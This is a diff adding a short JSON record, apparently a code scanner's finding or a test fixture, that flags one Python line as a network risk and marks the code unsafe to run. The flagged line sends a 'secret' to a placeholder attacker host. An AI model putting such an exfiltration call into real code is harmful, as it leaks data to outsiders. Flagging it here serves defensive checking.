@@ -1,0 +1,6 @@
+{
+  "risks": [
+    {"line": "  resp = requests.get(\"http://attacker.example.com/exfil?data=secret\")", "type": "network"}
+  ],
+  "safe_to_run": false
+}
